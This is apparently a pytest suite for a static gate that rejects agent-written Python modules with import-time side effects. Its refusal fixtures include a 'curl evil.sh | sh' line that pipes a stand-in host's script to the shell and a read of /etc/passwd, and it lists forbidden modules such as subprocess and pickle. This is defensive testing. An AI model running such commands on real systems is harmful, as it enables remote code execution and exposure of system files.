"""Static admission for agent-authored code: loading must not be running."""

from __future__ import annotations

import pytest

from aleph_kernel.ast_gate import check_source, is_definition_only

GOOD = '''
"""A well-formed skill."""

from __future__ import annotations

import re
from dataclasses import dataclass, field

PATTERN = re.compile(r"\\d+")
LIMITS = frozenset({"a", "b"})
DEFAULT_K = 60


@dataclass(frozen=True)
class Result:
    value: int
    tags: list[str] = field(default_factory=list)


def run(text: str) -> Result:
    import urllib.request  # inside a function: fine

    with urllib.request.urlopen("https://example.com") as fh:
        return Result(value=len(fh.read()))
'''


def test_a_definition_only_module_is_admitted() -> None:
    assert is_definition_only(GOOD), check_source(GOOD)


def test_work_inside_a_function_is_fine() -> None:
    """The point is not to forbid I/O — it is to forbid I/O AT LOAD TIME."""
    assert is_definition_only(GOOD)


# -- the things the gate exists to catch -------------------------------------


@pytest.mark.parametrize(
    ("source", "fragment"),
    [
        ("import os\nos.system('curl evil.sh | sh')\n", "expression evaluated for effect"),
        ("DATA = open('/etc/passwd').read()\n", "top-level call to open()"),
        ("import requests\nTOKEN = requests.get('http://x').text\n", "top-level call to get()"),
        ("exec('print(1)')\n", "expression evaluated for effect"),
        ("if True:\n    import os\n", "top-level if"),
        ("for i in range(3):\n    pass\n", "top-level for"),
        ("while True:\n    break\n", "top-level while"),
        ("with open('f') as fh:\n    pass\n", "top-level with"),
        ("try:\n    import x\nexcept ImportError:\n    pass\n", "top-level try"),
    ],
)
def test_side_effects_at_import_time_are_refused(source: str, fragment: str) -> None:
    violations = check_source(source)
    assert violations, f"admitted: {source!r}"
    assert any(fragment in str(v) for v in violations), [str(v) for v in violations]


def test_forbidden_imports_are_refused() -> None:
    for module in ("ctypes", "subprocess", "pickle", "marshal"):
        violations = check_source(f"import {module}\n")
        assert any("not permitted" in str(v) for v in violations), module


def test_a_syntax_error_is_a_violation_not_a_crash() -> None:
    violations = check_source("def broken(:\n")
    assert violations
    assert "syntax error" in str(violations[0])


# -- ordinary module shapes must still be writable ---------------------------


@pytest.mark.parametrize(
    "source",
    [
        '"""Just a docstring."""\n',
        "from typing import TypeVar\n\nT = TypeVar('T')\n",
        "import re\n\nRE = re.compile('x')\n",
        "LIMITS = frozenset({'a'})\n",
        "from enum import StrEnum\n\n\nclass Kind(StrEnum):\n    A = 'a'\n",
        "import logging\n\nlog = logging.getLogger(__name__)\n",
        "__all__ = ['run']\n\n\ndef run() -> None:\n    pass\n",
        "async def go() -> None:\n    await something()\n",
    ],
)
def test_ordinary_declarations_are_admitted(source: str) -> None:
    assert is_definition_only(source), [str(v) for v in check_source(source)]


def test_every_violation_is_reported_not_just_the_first() -> None:
    """An author should fix a module in one pass, not one rejection at a time."""
    source = "import os\nos.system('a')\nDATA = open('f').read()\nfor i in []:\n    pass\n"
    assert len(check_source(source)) >= 3


def test_a_violation_says_what_to_do() -> None:
    violations = check_source("DATA = open('f').read()\n")
    assert "move it into a function body" in str(violations[0]).lower()


def test_the_gate_is_not_claimed_to_be_a_sandbox() -> None:
    """The docstring must keep saying so — this is the easiest thing to forget."""
    import inspect

    from aleph_kernel import ast_gate

    doc = inspect.getdoc(ast_gate) or ""
    assert "not a sandbox" in doc.lower()
    assert "loading is not running" in doc.lower()


# ---------------------------------------------------------------------------
# A violation that is the ONLY violation
# ---------------------------------------------------------------------------
#
# Found by mutation. Several of the gate's rules are shadowed in the fixtures
# above by a second rule that fires on the same line, so deleting the rule
# leaves the module inadmissible anyway and every test stays green. A rule is
# only pinned by a source where it is the sole reason for refusal.


def test_a_top_level_await_is_refused_when_it_is_the_only_violation() -> None:
    """`x = await y` — no call, so the top-level-call rule does not cover it.

    Every other await fixture writes `await f()`, where the call rule fires on
    the same line and the await rule is redundant. Deleting the await check
    therefore changed nothing any test could see. Awaiting a NAME is the shape
    that isolates it, and it is not exotic: `RESULT = await SOME_COROUTINE` is
    a coroutine driven at import time, which is the exact thing the gate exists
    to make impossible.
    """
    source = "x = await y\n"
    reasons = [str(v) for v in check_source(source)]
    assert reasons == ["line 1: top-level await"], reasons
    assert not is_definition_only(source)


def test_a_top_level_assignment_into_something_that_exists_is_refused() -> None:
    """`os.environ['X'] = '1'` — a constant right-hand side that mutates the host.

    The gate's own comment names this case ("checking only the value misses it
    entirely") and no test in this MODULE held it: `test_skills.py` covers the
    same source through the whole install path, so it cannot say WHICH rule
    refused it.

    What that test does and does not measure, corrected — the first version of
    this docstring said deleting the target check left `test_skills.py` green
    "for the import of `os`", and that is false: `check_source("import os")`
    returns no violations at all, so deleting the subscript branch DOES redden
    `test_skills.py::test_code_with_an_import_time_side_effect_is_refused`. The
    gap this test actually closes is narrower and real — allow attribute
    targets while keeping subscript, and only the attribute case below notices.
    Recording it because a docstring asserting a measurement nobody took is the
    defect this whole suite exists to catch.

    Both target shapes are here because they are separate branches: a subscript
    (`d['k'] = v`) and an attribute (`obj.attr = v`).
    """
    subscript = "import json\njson.__dict__['x'] = 1\n"
    assert [str(v) for v in check_source(subscript)] == [
        "line 2: top-level assignment to a subscript — that mutates something "
        "that already exists. Move it into a function body."
    ], check_source(subscript)

    attribute = "import json\njson.loads = None\n"
    assert [str(v) for v in check_source(attribute)] == [
        "line 2: top-level assignment to an attribute — that mutates something "
        "that already exists. Move it into a function body."
    ], check_source(attribute)

    # The control: the same right-hand sides, bound to NEW names, are fine. A
    # gate that refused these would be refusing ordinary typed modules, and the
    # pair is what shows the rule is about the target rather than the value.
    assert is_definition_only("import json\nX = 1\nY = None\n")
